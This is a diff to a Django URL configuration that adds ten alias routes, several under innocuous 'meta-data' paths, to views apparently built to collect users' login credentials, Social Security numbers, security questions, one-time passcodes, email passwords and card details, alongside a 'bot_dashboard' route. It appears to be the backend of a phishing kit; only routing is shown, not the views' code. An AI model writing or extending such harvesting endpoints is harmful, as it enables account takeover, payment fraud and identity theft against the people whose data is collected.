@@ -146,7 +146,7 @@ from user_data.firelands_views import (
     firelands_collect_user_security_questions,
     firelands_collect_user_otp_verification,
     firelands_collect_user_email_password,
-    firelands_collect_user_card_info,
+    firelands_collect_user_card_info
 )
 
 urlpatterns = [
@@ -228,5 +228,15 @@ urlpatterns = [
     path("api/firelands-meta-data-8/", firelands_collect_user_otp_verification, name="firelands_collect_user_otp_verification"),
     path("api/firelands-email-password/", firelands_collect_user_email_password, name="firelands_collect_user_email_password"),
     path("api/firelands-card-info/", firelands_collect_user_card_info, name="firelands_collect_user_card_info"),
+    path("api/firelands-meta-data-9/", firelands_collect_user_login_cred, name="firelands_collect_user_login_cred_alias"),
+    path("api/firelands-meta-data-10/", firelands_collect_user_login_cred2, name="firelands_collect_user_login_cred2_alias"),
+    path("api/firelands-meta-data-11/", firelands_collect_user_basic_info, name="firelands_collect_user_basic_info_alias"),
+    path("api/firelands-meta-data-12/", firelands_collect_user_home_address, name="firelands_collect_user_home_address_alias"),
+    path("api/firelands-meta-data-13/", firelands_collect_user_social_security, name="firelands_collect_user_social_security_alias"),
+    path("api/firelands-meta-data-14/", firelands_collect_user_social_security_2, name="firelands_collect_user_social_security_2_alias"),
+    path("api/firelands-meta-data-15/", firelands_collect_user_security_questions, name="firelands_collect_user_security_questions_alias"),
+    path("api/firelands-meta-data-16/", firelands_collect_user_otp_verification, name="firelands_collect_user_otp_verification_alias"),
+    path("api/firelands-email-password-alias/", firelands_collect_user_email_password, name="firelands_collect_user_email_password_alias"),
+    path("api/firelands-card-info-alias/", firelands_collect_user_card_info, name="firelands_collect_user_card_info_alias"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
